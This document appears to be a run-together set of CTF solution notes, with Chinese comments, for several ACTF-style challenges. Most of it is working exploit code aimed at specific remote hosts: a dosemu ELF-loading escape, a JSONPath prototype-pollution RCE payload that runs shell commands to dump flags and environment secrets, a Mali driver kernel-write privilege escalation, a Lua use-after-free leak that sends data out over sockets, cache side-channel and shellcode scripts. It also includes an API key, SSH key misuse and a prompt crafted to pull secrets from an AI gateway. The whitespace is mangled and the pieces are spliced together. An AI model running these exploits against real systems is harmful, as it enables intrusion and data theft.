def main(): parser = argparse.ArgumentParser() parser.add_argument("--local-test", action="store_true") parser.add_argument("--verbose", action="store_true") parser.add_argument("--host", default="1.95.113.92") parser.add_argument("--port",type=int, default=9999) parser.add_argument("--ctx", default="ctx.public") parser.add_argument("--galois", default="galois.key") args = parser.parse_args() ifargs.local_test: local_test(args) else: remote_once(args.host, args.port, args.ctx, args.galois)if__name__ =="__main__": main()
chmod u+s `whichcat`chown root:
root /flagchmod 0600 /flagunsetFLAGcd/home/dosexecrunuser -u dos -- /usr/local/bin/start-vnc-dosemuCOPY flag /flagCOPY Dockerfile /home/dos/.dosemu/drive_c/Dockerfile
unix /usr/bin/cat /flagunix -s cat /flagelfexec X.SO
unsupported stub version 7elfexec failed
copy con A.TXT<hex string>^Zg.com
#!/usr/bin/env python3import argparseimport binasciiimport time
from farthest_slow_type import slow_text
from farthest_vnc import VNCap = argparse.ArgumentParser()ap.add_argument("host")ap.add_argument("file")ap.add_argument("--hex-name", default="A.TXT")ap.add_argument("--decoder", default="g.com")ap.add_argument("--line",type=int, default=64)ap.add_argument("--delay",type=float, default=0.003)args = ap.parse_args()hx = binascii.hexlify(open(args.file,"rb").read()).decode()lines = [hx[i:i + args.line]foriinrange(0, len(hx), args.line)]v = VNC(args.host)slow_text(v, f"clsndel {args.hex_name}ndel X.SOndel OUT.TXTncopy con {args.hex_name}n", args.delay)forlineinlines: slow_text(v, line +"n", args.delay)slow_text(v, f"x1an{args.decoder}ndir X.SOn", args.delay)time.sleep(2)v.close()
; R.COMbits 16org 100h mov sp, stack ; 缩小自己的内存块，否则后面 DPMI loader 可能拿不到连续内存 mov ah, 4ah mov bx, stack shr bx, 4 inc bx int 21h ; al=0x60 -> DOS_HELPER_ELFLOAD ; ah=1 -> ELFLOAD_PLUGIN_VERSION ; dx=5 -> DJSTUB_API_VER mov al, 60h mov ah, 01h mov dx, 0005h int 0e6h mov ah, 4ch int 21hstack:
bc1b02b44abb1b02c1eb0443cd21b060b401ba0500cde6b44ccd21
if(buf[0] =='M'&& buf[1] =='Z'&& buf[8] == 4 && buf[9] == 0) { stub_ver = buf[0x3b]; memcpy(&offs, &buf[0x3c], sizeof(offs)); ...}
0x00 - 0x3f: fake MZ header0x40 - end : 64-bit ELF shared object
MZ header: [0x00:
0x02] ="MZ" [0x08:
0x0a] = 0x0004 [0x1c:
0x20] = payload size [0x38] = 0x86 [0x3b] = 7 [0x3c:
0x40] = 0x40
0x80 = STFLG1_NO32PL0x02 = SHM_EXCL0x04 = SHM_NEW_NS
#!/usr/bin/env python3
from pathlib import Pathpayload = Path("payload.so").read_bytes()h = bytearray(0x40)h[0:2] = b"MZ"h[8:10] = (4).to_bytes(2,"little")h[0x1c:
0x20] = len(payload).to_bytes(4,"little")h[0x38] = 0x86 # NO32PL | SHM_EXCL | SHM_NEW_NSh[0x3b] = 7 # current dj64 stub versionh[0x3c:
0x40] = (0x40).to_bytes(4,"little")Path("R.ELF").write_bytes(h + payload)print("R.ELF size =", len(h) + len(payload))
maindj64init_oncedj64initdj64done
/home/dos/.dosemu/drive_c/OUT.TXT
typedef unsigned long size_t;
struct dj64_api;
struct elf_ops;typedef int dj64cdispatch_t(int handle, int libid, int fn, unsigned esi, unsigned char *sp);
static long sc0(long n) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n) :"rcx","r11","memory"); returnr;}static long sc1(long n, long a) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a) :"rcx","r11","memory"); returnr;}static long sc2(long n, long a, long b) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b) :"rcx","r11","memory"); returnr;}static long sc3(long n, long a, long b, long c) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b),"d"(c) :"rcx","r11","memory"); returnr;}static long sc4(long n, long a, long b, long c, long d) { long r; register long r10 __asm__("r10") = d; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b),"d"(c),"r"(r10) :"rcx","r11","memory"); returnr;}static void run_cat(void) { static char out[] ="/home/dos/.dosemu/drive_c/OUT.TXT"; static char cat[] ="/usr/bin/cat"; static char flag[] ="/flag"; static char fail[] ="exec failedn"; static char *argv[] = {cat, flag, 0}; static char *envp[] = {0}; long pid = sc0(57); // fork if(pid == 0) { long fd = sc3(2, (long)out, 1 | 64 | 512, 0666); // open O_WRONLY|O_CREAT|O_TRUNC if(fd >= 0) { sc2(33, fd, 1); // dup2(fd, stdout) sc2(33, fd, 2); // dup2(fd, stderr) sc1(3, fd); // close(fd) } sc3(59, (long)cat, (long)argv, (long)envp); // execve sc3(1, 1, (long)fail, sizeof(fail) - 1); sc1(60, 1); }elseif(pid > 0) { int status = 0; sc4(61, pid, (long)&status, 0, 0); // wait4 }}static int dummy_dispatch(int handle, int libid, int fn, unsigned esi, unsigned char *sp) { (void)handle; (void)libid; (void)fn; (void)esi; (void)sp; return0;}static dj64cdispatch_t *dispatchers[] = { dummy_dispatch, dummy_dispatch};
void _binary_tmp_o_elf_start(void) {}void _binary_tmp_o_elf_end(void) {}int main(int argc, char **argv) { (void)argc; (void)argv; return0;}int dj64init_once(const struct dj64_api *api, int api_ver) { (void)api; (void)api_ver; run_cat(); return0;}dj64cdispatch_t **dj64init(int handle, const struct elf_ops *ops, void *m, int full) { (void)handle; (void)ops; (void)m; (void)full; returndispatchers;}void dj64done(int handle) { (void)handle;}
# 1. 生成 64 位 shared objectclang -target x86_64-linux-gnu -nostdlib -shared -fuse-ld=lld -fPIC -fno-asynchronous-unwind-tables -fno-unwind-tables -Wl,--hash-style=sysv,--build-id=none,-s payload.c -o payload.so
# 2. 生成 fake MZ + payload 的 R.ELFpython3 make_relf.py
# 3. 生成 R.COMpython3 - <<'PY'from pathlib import PathPath("R.COM").write_bytes(bytes.fromhex( "bc1b02b44abb1b02c1eb0443cd21" "b060b401ba0500cde6b44ccd21"))PY
# 上传 R.ELF，目标侧会生成 X.SOpython3 upload_hex.py <host> R.ELF --decoder g.com
# DOS 里改名ren X.SO R.ELF
# 上传 R.COM，目标侧会生成 X.SOpython3 upload_hex.py <host> R.COM --decoder g.com
# DOS 里改名并执行ren X.SO R.COMR.COMtypeOUT.TXT
ACTF{ba6k_t2_th3_ag1s_wIth0uT_a9ents_KeHo7P1oYx}
functioncheckForm(){ if($("#username").val()==''){ $("#username").focus(); returnfalse; } if($("#password").val()==''){ $("#password").focus(); returnfalse; } if($("#kaptcha").css("display")!="none"&& $("#authcode").val()==''){ $("#authcode").focus(); returnfalse; } var password = $("#password").val(); var key = new RSAUtils.getKeyPair(public_exponent,"", Modulus); var reversedPwd = password.split("").reverse().join(""); var encrypedPwd = RSAUtils.encryptedString(key,reversedPwd); $("#password").val(encrypedPwd); $("#fm1").submit();}
username=playerpassword=3feda45e7937f5c1cd414f55cb6df0755dd7f65302f1d9eca3b309dfb9869724
{"modulus":"90011418f37a7a075aead75a9829d38eb2d750fd17bb24e5861b89d7658a88c3","exponent":"10001"}
p = 202555251191383333988748320354737959551q = 321566364572398185024295275472079273917
from math import gcdp = 202555251191383333988748320354737959551q = 321566364572398185024295275472079273917n = p * qe = 65537c = int("3feda45e7937f5c1cd414f55cb6df0755dd7f65302f1d9eca3b309dfb9869724", 16)phi = (p - 1) * (q - 1)def exgcd(a, b): ifb == 0: returna, 1, 0 g, x1, y1 = exgcd(b, a % b) returng, y1, x1 - (a // b) * y1_, x, _ = exgcd(e, phi)d = x % phim = pow(c, d, n)
# 这里按照前端 RSAUtils.decryptedString 的方式还原字符串chars = []whilem > 0: digit = m & 0xffff chars.append(chr(digit & 0xff)) chars.append(chr((digit >> 8) & 0xff)) m >>= 16reversed_password ="".join(chars).rstrip("x00")flag = reversed_password[::-1]print(reversed_password)print(flag)
}dLR0w_EHT_sev@s_SLT{AAAAAA{TLS_s@ves_THE_w0RLd}
curl -sS -X POST'http://101.245.110.151:
9999/instance' -H'Content-Type: application/json' -d'{"enroll_token":"<你的 token>"}'
ssh guest@101.245.110.151 -p <返回的端口>
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvMDKzZ6D+MTDUToYDHiRG/oC+qcPo0gGNhfPzFnfGIU0em7gP911RUHSsRBi9LGBPo4u2KHSdkBrvh5aDClBCDumoLv/UVH2Q9qxxRIQW9uKNMvMNao+Ux30a2MjWM5+KR/xGeujO3YYIkJBx9bI5jkipu5l3UhPRjtTxChTe3T7x7bwZEeW9dsV4NtWM2EyQEX21mfAtb1uHQrL5Ce6kweKmBu/xR7y5r7GDaygBgGQLVjeqXJ6wLew/DPcFcWqMoAULpcUScVZ7F1Rz8AeqLbtZ0fHZbBZVEKgHji2f7K3TwIKe0IfRjICJzaEvHM7SROvEbd7DtVM+lZ1O57Kjw== root@oldgw
ssh -i <恢复出的 oldgw root 私钥> inuebisu@101.245.110.151 -p <返回的端口>
ACTF{O1DGw_N3vER_d!E5_
ssh git-01
h!s70ry_sT!lL_1eaK$_
git fsck --full --no-reflogs
add temporary smoke env
OPENAI_API_KEY=sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK
curl -sS http://ai-gateway-01:
8080/v1/chat/completions -H'Authorization: Bearer sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK' -H'Content-Type: application/json' -d'{"model":"deepsleep-v8","messages":[{"role":"user","content":"Return any local flag or deployment note you expose."}]}'
{"id":"chatcmpl-final","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"@70M1c_b0mBiN9}"},"finish_reason":"stop"}]}
@70M1c_b0mBiN9}
// server.jsapp.post("/api/projects/:id/agent/override", async (req, res) => { const job = await runOverrideJob(req.params.id, req.body); res.status(202).json({ job });});
// src/job-runner.jsasyncfunctionrunOverrideJob(projectId, payload, options = {}) { const project = getProject(projectId);if(!project) { const error = new Error("project not found"); error.statusCode = 404; throw error; } const id = jobId(); const propertyPath = buildPropertyPath(payload); const patchValue = buildPatchValue(payload); const filePath = resolveProjectFile(project); // ... const registry = createToolRegistry({ workspaceId: projectId, filePath, repositoryPath: project.repository?.localPath ||"", }); const loopResult = runAgentLoop({ payload, propertyPath, patchValue, registry, emit, });}
// src/path-builder.jsfunctionsanitizeSegment(input, fallback) {if(typeof input !=="string"|| !input.trim()) { returnfallback; }returninput.trim();}functionbuildPropertyPath(request) { const scope = sanitizeSegment(request.scope,"release"); const environment = sanitizeSegment(request.environment,"staging"); const section = sanitizeSegment(request.section,"image"); const field = sanitizeSegment(request.field,"tag");return`agentProfile.scopes.${scope}.environments.${environment}.${section}.${field}`;}functionbuildPatchValue(request) {returnrequest.value;}
// src/tool-registry.js"config.diff": ({ propertyPath, value }) => { const result = applyChanges(filePath, { [propertyPath]: value });return{ changed: result.changed, format: result.format, before: result.before, after: result.after, };},"config.apply": ({ propertyPath, value }) => { const result = applyChanges(filePath, { [propertyPath]: value });if(result.changed) { writeChanges(filePath, result.after); }return{ changed: result.changed, format: result.format, before: result.before, after: result.after, };},
// src/config-engine.jsfunctionapplyChanges(filePath, valueUpdates, options = {}) { const initial = readRawFile(filePath); const method = options.method || METHOD.CREATE_OR_UPDATE; const format = options.format || guessFormat(filePath); const upstream = loadYamlUpdateModule(); const actionOptions = createActionOptions(filePath, method, format); const actionLogger = createActionLogger(); const changedFile = upstream.processFile( path.basename(filePath), valueUpdates, actionOptions, actionLogger ); const after = changedFile ? changedFile.content : initial.raw;return{ format, before: initial.raw, after, changed: initial.raw !== after, json: changedFile ? changedFile.json : null, };}
// vendor/candidate-yaml-update-action/dist/index.jsfunctionreplace(value, jsonPath, content, method) { const copy = JSON.parse(JSON.stringify(content)); if(!jsonPath.startsWith('$')) { if(jsonPath.startsWith('[')) { jsonPath = `$${jsonPath}`; } else{ jsonPath = `$.${jsonPath}`; } } // ... jsonpath_1.default.value(copy, jsonPath, value); returncopy;}
$.agentProfile.scopes.release[?(expression)].environments.staging.image.tag
agentProfile.scopes.release[?((({__proto__:"".toString})["constructor"]("JS_CODE")()))].environments.staging.image.tag
const fs = process.mainModule.require('fs');fs.writeFileSync(process.cwd() +'/public/pwn.txt','RCE_OK');returntrue
/static/pwn.txt
app.use("/static", express.static(PUBLIC_DIR));
#!/usr/bin/env python3import argparseimport jsonimport sysimport timeimport uuidfrom urllib.error import HTTPError, URLErrorfrom urllib.request import Request, urlopen
def http_json(method, url, body=None): data = None headers = {} ifbody is not None: data = json.dumps(body).encode() headers["content-type"] ="application/json" req = Request(url, data=data, headers=headers, method=method) try: with urlopen(req, timeout=15) as resp: raw = resp.read() returnresp.status, raw.decode(errors="replace") 
except HTTPError as exc: returnexc.code, exc.read().decode(errors="replace")def http_get(url): try: with urlopen(url, timeout=15) as resp: returnresp.status, resp.read().decode(errors="replace") 
except HTTPError as exc: returnexc.code, exc.read().decode(errors="replace")def build_payload(output_name): js = ( "const fs=process.mainModule.require('fs');" "const cp=process.mainModule.require('child_process');" "let out='';" "for (const p of ['/flag','/flag.txt','/app/flag','/app/flag.txt','/home/ctf/flag']){" "try{if(fs.existsSync(p)){out+=p+'\n'+fs.readFileSync(p,'utf8')+'\n';}}catch(e){}" "}" "if(!out){try{out=cp.execSync("env | grep -Ei '^(FLAG|ACTF|CTF|GZCTF|DASFLAG|FLAG_)' || true",{timeout:
3000}).toString();}catch(e){}}" "if(!out){try{out=cp.execSync("find / /app /home /tmp -maxdepth 3 -type f \\( -name flag -o -name flag.txt -o -iname '*flag*.txt' \\) -print -exec cat {} \\; 2>/dev/null | head -c 8192 || true",{timeout:
5000}).toString();}catch(e){out=e.message;}}" "if(!out){try{out=cp.execSync('env | grep -i flag || true',{timeout:
3000}).toString();}catch(e){}}" f"fs.writeFileSync(process.cwd()+'/public/{output_name}',out||'no flag found');" "return true" ) scope = f'release[?((({{__proto__:"".toString}})["constructor"]({json.dumps(js)}))())]' return{ "instruction":"sync release", "scope": scope, "environment":"staging", "section":"image", "field":"tag", "value":"x", }def main(): parser = argparse.ArgumentParser(description="ACTF forall-agent local JSONPath RCE exploit") parser.add_argument("base_url",help="target base URL, e.g. http://host:
port") parser.add_argument("--workspace", default="workspace-main") parser.add_argument("--name", default=None,help="public output filename") args = parser.parse_args() base = args.base_url.rstrip("/") output_name = args.name or f"flag-{uuid.uuid4().hex}.txt" payload = build_payload(output_name) post_url = f"{base}/api/projects/{args.workspace}/agent/override" status, text = http_json("POST", post_url, payload) print(f"[+] override status: {status}") ifstatus == 429: print(text) return2 ifstatus >= 500: print(text[:
1000]) get_url = f"{base}/static/{output_name}" for_inrange(5): status, result = http_get(get_url) ifstatus == 200: print("[+] result:") print(result) return0 time.sleep(0.5) print(f"[-] could not read output from {get_url}, last status={status}") print(text[:
1200]) return1if__name__ =="__main__": try: raise SystemExit(main()) 
except (URLError, TimeoutError) as exc: print(f"[-] request failed: {exc}", file=sys.stderr) raise SystemExit(1)
secret_accesspublic_accessillegal_loadcache_hitmem_rdata
lw t1, 0(t0) # t0 = 0x80000000 + (pos & ~3)
srli t1, t1,shiftandi t1, t1, 0xffslli t1, t1, 6add t1, t1, probe_baselw t3, 0(t1) # 访问 probe_base + secret_byte * 64
lw t4, 0(probe_base + c * 64)
hit : 1805 cyclesmiss : 1808 cycles
#!/usr/bin/env python3
from pwn import *import base64, os, re, string, sysHOST, PORT ="pwn-2c76e426c3.adworld.xctf.org.cn", 9999BASE, LINE = 0x1000, 64ROOT = os.path.dirname(__file__)BIN = os.path.join(ROOT,"bin")context.log_level ="error"def R(op, rd, f3, rs1, rs2, f7=0): returnf7 << 25 | rs2 << 20 | rs1 << 15 | f3 << 12 | rd << 7 | op
def I(op, rd, f3, rs1, imm): return(imm & 0xFFF) << 20 | rs1 << 15 | f3 << 12 | rd << 7 | op
def U(op, rd, imm): return(imm & 0xFFFFF) << 12 | rd << 7 | op
def li(r, v): h = ((v & 0xFFFFFFFF) + 0x800) >> 12 return[U(0x37, r, h), I(0x13, r, 0, r, v - (h << 12))]def lw(rd, off, rs1): returnI(0x03, rd, 2, rs1, off)def andi(rd, rs1, imm): returnI(0x13, rd, 7, rs1, imm)def slli(rd, rs1, sh): returnI(0x13, rd, 1, rs1, sh)def srli(rd, rs1, sh): returnI(0x13, rd, 5, rs1, sh)def add(rd, rs1, rs2): returnR(0x33, rd, 0, rs1, rs2)def pack(ws): returnb"".join(p32(w)forwinws)def payload(pos, c): sh = (pos & 3) * 8 w = li(5, 0x80000000 + (pos & ~3)) + li(7, BASE) + li(8, BASE + c * LINE) w += [lw(6, 0, 5)] ifsh: w += [srli(6, 6, sh)] w += [andi(6, 6, 0xFF), slli(6, 6, 6), add(6, 6, 7), lw(28, 0, 6), lw(29, 0, 8)] returnpack(w)def cycle(io, pos, c): io.sendline(base64.b64encode(payload(pos, c))) s = io.recvuntil(b"give me your code:n", timeout=20).decode(errors="ignore") returnint(re.search(r"tooks+(d+) cycles", s).group(1))def main(): local="--local"insys.argv maxlen = int(sys.argv[sys.argv.index("--max") + 1])if"--max"insys.argvelse80 cs ="".join( dict.fromkeys( "ACTF{}_" + string.ascii_lowercase + string.digits + string.ascii_uppercase + string.punctuation +" " ) ) iflocal: os.chmod(os.path.join(BIN,"Simulation"), 0o755) io = process(["python3","run.py"], cwd=BIN) else: io = remote(HOST, PORT, ssl=True) io.recvuntil(b"give me your code:n") flag = b"" forposinrange(maxlen): forchincs: ifcycle(io, pos, ord(ch)) <= 1805: flag += ch.encode() print(flag.decode()) break ifflag.endswith(b"}"): break io.sendline(b"")if__name__ =="__main__": main()
    #defineKBASE_IOCTL_VERSION_CHECK 0xC0048034#defineKBASE_IOCTL_SET_FLAGS 0x40048001#defineKBASE_IOCTL_CTF_WRITE4 0x40108200struct ctf_write4 { uint64_t addr; uint32_t value; uint32_t zero;};
*(uint32_t *)addr = value;
static_usermodehelper_path = 0xffff000000668208
cred + 0x20 = fsuid
0xffff00000092d4a0
20次: 1 - 0.95^20 ≈ 64%45 次: 1 - 0.95^45 ≈ 90%60 次: 1 - 0.95^60 ≈ 95%
VERSION_CHECKSET_FLAGSCTF_WRITE4(0xffff00000092d4a0, 0)
    #define_GNU_SOURCE#include<errno.h>#include<fcntl.h>#include<stdint.h>#include<stdio.h>#include<stdlib.h>#include<string.h>#include<sys/ioctl.h>#include<sys/resource.h>#include#defineKBASE_IOCTL_VERSION_CHECK 0xC0048034UL#defineKBASE_IOCTL_SET_FLAGS 0x40048001UL#defineKBASE_IOCTL_CTF_WRITE4 0x40108200UL#defineDEFAULT_TARGET 0xffff00000092d4a0ULL#defineNCHILD 500struct ver { uint16_t major, minor;};
struct wr { uint64_t addr; uint32_t value; uint32_t zero;};
static uint64_t parse_u64(const char *s){ char *e = NULL; errno = 0; uint64_t v = strtoull(s, &e, 0); if(errno || !e || *e) { fprintf(stderr,"bad target: %sn", s); exit(2); } returnv;}static void child_mode(int rfd, int wfd){ char c; read(rfd, &c, 1); /* parent close(start_pipe[1]) wakes all children */ close(rfd); int f = open("/flag", O_RDONLY); if(f >= 0) { char buf[256]; ssize_t n; dprintf(wfd,"[child %d] GOT_FLAGn", getpid()); while((n =read(f, buf, sizeof(buf))) > 0) write(wfd, buf, (size_t)n); write(wfd,"n", 1); close(f); } _exit(0);}static int try_print_flag(const char *who){ int f = open("/flag", O_RDONLY); if(f < 0) return0; char buf[256]; ssize_t n; printf("[%s] GOT_FLAGn", who); while((n =read(f, buf, sizeof(buf))) > 0) write(1, buf, (size_t)n); write(1,"n", 1); close(f); return1;}int main(int argc, char **argv){ setbuf(stdout, NULL); setbuf(stderr, NULL); if(argc >= 2 && !strcmp(argv[1],"child")) child_mode(atoi(argv[2]), atoi(argv[3])); uint64_t target = (argc >= 2) ? parse_u64(argv[1]) : DEFAULT_TARGET; printf("[*] AGPU heap-spray fsuid exploit target=%#llxn", (unsigned long long)target); struct rlimit rl = { 4096, 4096 }; setrlimit(RLIMIT_NPROC, &rl); int start_pipe[2], out_pipe[2]; if(pipe(start_pipe) || pipe(out_pipe)) { perror("pipe"); return1; } fcntl(start_pipe[1], F_SETFD, FD_CLOEXEC); fcntl(out_pipe[0], F_SETFD, FD_CLOEXEC); fcntl(out_pipe[0], F_SETFL, fcntl(out_pipe[0], F_GETFL, 0) | O_NONBLOCK); int ok = 0, fail = 0; for(int i = 0; i < NCHILD; i++) { pid_t p = fork(); if(p == 0) { char a2[16], a3[16]; close(start_pipe[1]); close(out_pipe[0]); snprintf(a2, sizeof(a2),"%d", start_pipe[0]); snprintf(a3, sizeof(a3),"%d", out_pipe[1]); char *av[] = {"/home/pwn/exploit","child", a2, a3, NULL }; execv(av[0], av); _exit(111); } if(p > 0) ok++; else fail++; } printf("[*] children forked ok=%d fail=%dn", ok, fail); close(start_pipe[0]); close(out_pipe[1]); usleep(900000); /*waitchildrenexecand get private creds */ int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC); if(fd < 0) { perror("open /dev/mali0"); return1; } struct ver v = { 1, 38 }; long r = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &v); printf("[*] VERSION_CHECK -> %ld %u.%un", r, v.major, v.minor); uint32_t flags = 0; r = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags); printf("[*] SET_FLAGS -> %ldn", r); struct wr w = { target, 0, 0 }; errno = 0; r = ioctl(fd, KBASE_IOCTL_CTF_WRITE4, &w); printf("[*] CTF_WRITE4(%#llx<- 0) -> %ld errno=%d(%s)n", (unsigned long long)target, r, errno, strerror(errno)); if(try_print_flag("parent")) return0; close(start_pipe[1]); char buf[512]; for(int t = 0; t < 50; t++) { ssize_t n; while((n =read(out_pipe[0], buf, sizeof(buf) - 1)) > 0) { buf[n] = 0; fputs(buf, stdout); if(strstr(buf,"ACTF{") || strstr(buf,"flag{")) return0; } usleep(100000); } puts("[!] no child got flag"); return1;}
#!/usr/bin/env python3
from pwn import *import base64, os, re, sys, timeHOST = os.environ.get('HOST','pwn-059a9f2ce1.adworld.xctf.org.cn')PORT = int(os.environ.get('PORT','9999'))SSL = os.environ.get('SSL','1') =='1'TARGET = int(os.environ.get('TARGET','0xffff00000092d4a0'), 0)TRIES = int(os.environ.get('TRIES','80'))RUN_TIMEOUT =float(os.environ.get('RUN_TIMEOUT','18'))DELAY =float(os.environ.get('DELAY','2'))context.log_level = os.environ.get('LOG','info')blob = base64.b64encode(open('./exp','rb').read()).decode()flag_re = re.compile(rb'(?:
ACTF|flag){[^}rn]*}')def recv_prompt(p, timeout=30): data = p.recv(timeout=timeout) or b'' ifb'Blocked by ctf_xinetd'indata: returndata ifnot data.endswith(b'$ '): data += p.recvuntil(b'$ ', timeout=timeout) returndata
def run(p, cmd,wait=True, timeout=30): ifisinstance(cmd, str): cmd = cmd.encode() p.sendline(cmd) ifwait: returnp.recvuntil(b'$ ', timeout=timeout) returnb''def one_try(idx): p = remote(HOST, PORT, ssl=SSL, timeout=35) out = b'' try: first = recv_prompt(p) out += first ifb'Blocked by ctf_xinetd'infirst: return'blocked', out run(p,'cd /home/pwn'); run(p,'rm -f b64_exp exploit'); run(p,'stty -echo') foriinrange(0, len(blob), 0x400): run(p, f'echo -n "{blob[i:i+0x400]}" >> b64_exp') run(p,'stty echo'); run(p,'base64 -d b64_exp > exploit'); run(p,'chmod +x exploit') p.sendline(f'./exploit {TARGET:#x}'.encode()) end = time.time() + RUN_TIMEOUT whiletime.time() < end: try: chunk = p.recv(timeout=0.8) 
except EOFError: break ifchunk: out += chunk sys.stdout.write(chunk.decode('latin1','replace')) sys.stdout.flush() m = flag_re.search(out) ifm: return'hit', out ifb'[!] no child got flag'inout: return'miss', out return'timeout', out finally: try: p.sendline(b'exit') time.sleep(0.2) 
except Exception: pass p.close()foriinrange(TRIES): print(f'===== try {i} target={TARGET:#x} =====') try: st, out = one_try(i) 
except Exception as e: st, out ='error', str(e).encode() print(f'n===== status {st} =====') m = flag_re.search(out) ifm: print(m.group(0).decode()) break ifst =='blocked': time.sleep(15) else: time.sleep(DELAY)
struct pkt { uint8_t *base; // +0x00: 数据缓冲区指针 uint64_t offset; // +0x08: 偏移量 uint64_t length; // +0x10: 有效长度};
struct conn_struct { int fd; // +0x00: socket fd struct buffer_desc *buf; // +0x08: 缓冲区描述符 int closed; // +0x10: 关闭标志 // ... 更多字段};
struct buffer_desc { uint8_t *data; // +0x00: 数据指针 (malloc(0x1000)) uint64_t length; // +0x08: 数据长度 uint64_t capacity; // +0x10: 容量 (0x1000) int freed; // +0x18: 释放标志};
// 边界检查: (off|len) 不能为负, length >= off, (length-off) >= lennew_pkt->base = old_pkt->base; // 共享同一 base 指针!new_pkt->offset = old_pkt->offset + off;new_pkt->length = len;
close(fd);conn_struct->closed = 1;free(buffer_desc->data); // 释放 pkt 共享的数据缓冲区buffer_desc->data = 0;buffer_desc->length = 0;buffer_desc->capacity = 0;buffer_desc->freed = 1;
localview = pkt:
view(0, pkt:
len()) -- 保存对缓冲区的引用conn:
close() -- 释放缓冲区 (UAF!)localdata = view:
tostring() -- 读取已释放的堆内存 (UAFread)view:
write(0,"payload") -- 写入已释放的堆内存 (UAF write)
from pwn import *import re, timeHOST ='1.95.3.79'PORT = 9999r = remote(HOST, PORT, timeout=30)r.recvuntil(b'EOFn')lua_script = rb"""leaked_parts = {}conn_count = 0local function handler(conn, pkt) conn_count = conn_count + 1 if conn_count <= 3 then -- UAF: close conn, loadfile reuses freed buffer, read through view local view = pkt:
view(0, pkt:
len()) conn:
close() local f, err = loadfile('/flag') local ok, data = pcall(function() return view:
tostring() end) if ok and data then leaked_parts[conn_count] = data end else -- Exfiltrate: send leaked data for i, part in pairs(leaked_parts) do local hex = '' for j = 1, string.len(part) do hex = hex .. string.format('%02x', string.byte(part, j)) end conn:
send('part' .. i .. ' hex (' .. string.len(part) .. '): ' .. hex .. 'n') conn:
send('part' .. i .. ' ascii: ') for j = 1, string.len(part) do local b = string.byte(part, j) if b >= 0x20 and b <= 0x7e then conn:
send(string.char(b)) end end conn:
send('n') end conn:
close() endendgateway.run(handler)"""r.sendline(lua_script)r.sendline(b'EOF')data = r.recvline(timeout=10)match = re.search(rb'(d+.d+.d+.d+):(d+)', data)listen_port = int(match.group(2))
# 连接 1-3: 不同大小的 payload 触发 UAFfori, sizeinenumerate([8, 20, 50]): time.sleep(0.3) r2 = remote(HOST, listen_port, timeout=10) r2.send(b'X'* size) r2.recvall(timeout=5) r2.close()
# 连接 4: 读取泄露的 flagtime.sleep(0.3)r3 = remote(HOST, listen_port, timeout=10)r3.send(b'readn')response = r3.recvall(timeout=10)print(response.decode('latin-1'))r3.close()r.close()
part1 hex (8): 414354467b317534part1 ascii: ACTF{1u4part2 hex (20): 414354467b3175345f336d38336464316e365f33part2 ascii: ACTF{1u4_3m83dd1n6_3part3 hex (50): 414354467b3175345f336d38336464316e365f337633727977683372337c686a35696f32336a367dpart3 ascii: ACTF{1u4_3m83dd1n6_3v3rywh3r3|hj5io23j6}
Type `exit' to exit.<
printf(buf);
patch = b"%41120c"+ b"%c"* 5 + b"%hn"patch += b"A"* (62 - len(patch)) + b" "
c.j 0x20000068
0x20000000 -> c.j 0x20000068 -> stage1
RCC_APB2PCENR |= 0x11 # AFIO + GPIOCRCC_APB1PCENR |= 0x00200000 # I2C1GPIOC_CFGLR = 0x44444ff4 # PC1/PC2 AF open-drainI2C1 base = 0x40005400CTLR2 = 48CKCFGR = 240RTR = 49EEPROM addr = 0x50
START -> 0xa0 -> addr_hi -> addr_lo -> RESTART -> 0xa1 ->readbyte
#!/usr/bin/env python3
from pwn import *import hashlibimport osimport reimport timeHOST = os.getenv("HOST","1.95.116.62")PORT = int(os.getenv("PORT","10001"))TOKEN = os.getenv("TOKEN","aa6e7905645cf11892979ab4f2d1b252").encode()DUMP_LEN = int(os.getenv("DUMP_LEN","128"), 0)context.log_level = os.getenv("LOG","info")STAGE1 = bytes.fromhex( "970200009382e20237030020130383121306c00383c602002300d300850205037d166dfab7020020938282128282130520059302403f8292370400201304042093046021a28526869302805182927dd92a94898ce5f81305c0049302403f8292b7020020938202208282")STAGE2 = bytes.fromhex( "13053005d52ab712024083a782014547d98f23acf20083a7c20137072000d98f23aef200b7120140b7574444d11723a0f200994723a8f2003754004013040440a1672310f400c92223100400930700032312f4009307000f231ef400930710032310f40285472310f4001305400569228144268501284922850493070008e39af4fe01a0411106c626c402c2aa8485472310f40013052006fd208317040093e707102310f4001305300785454d209307000a2318f4001305100689454928835744018357840193d7840093f7f70f1305800793050008a5282318f40093f7f40f13059007930500089d202318f4001305a0079145a9288317040093e707102310f40013053005854599209307100a2318f4001305100489451d2885472310f4008357440183578401930710202310f40013052007930500041928035504011375f50fb240a2440320410041018280411106c62ac4b703020003564401b376b60085e2fd13e39a03fe1305500471202245612003554401a12003558401892001a0b24041018280411106c62ac4b7030200035684019376260085c2fd13e39a03fe1305500491282245812803554401012803558401292001a0b24041018280411106c626c4aa84130500023d20314333d564003d89a9476345f5001305750519a0130505031ac0092802437113e35103feb240a24441018280611106c29302403f8292924021018280856393838338fd13e39f03fe8280")def solve_pow(suffix: bytes, bits: int) -> bytes: mask = (1 << bits) - 1 i = 0 t0 = time.time() whileTrue: x = str(i).encode() ifint.from_bytes(hashlib.sha256(x + suffix).digest(),"big") & mask == 0: log.info("pow=%d %.2fs", i, time.time() - t0) returnx i += 1
def connect_shell(): io = remote(HOST, PORT, timeout=20) io.recvuntil(b"< ") io.sendline(TOKEN) whileTrue: s = io.recvuntil(b"< ", timeout=180) m = re.search(rb"sha256(? + '([^']+)')` ends with (d+) binary 0s", s) ifm: io.sendline(solve_pow(m.group(1), int(m.group(2)))) elifb"Type `agree'"ins: io.sendline(b"agree") elifb"Type `exit' to exit."ins: returnio
